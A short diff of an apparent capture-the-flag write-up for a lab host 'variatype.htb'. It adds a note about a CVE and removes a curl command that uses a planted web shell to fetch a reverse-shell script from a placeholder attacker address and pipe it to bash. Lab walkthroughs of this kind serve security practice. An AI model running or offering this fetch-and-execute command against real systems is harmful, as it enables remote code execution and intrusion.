@@ -18,6 +18,8 @@ found subdomain:
 portal.variatype.htb
 ```
 
+	found some **CVE-2025-66034** 
+
+
 Reference: `VT-VALID-2.1.4` 
 
-curl -s “[http://portal.variatype.htb/files/shell.php?cmd=curl+YOUR_IP:8080/rev.sh](http://portal.variatype.htb/files/shell.php?cmd=curl+YOUR_IP:8080/rev.sh)|bash”
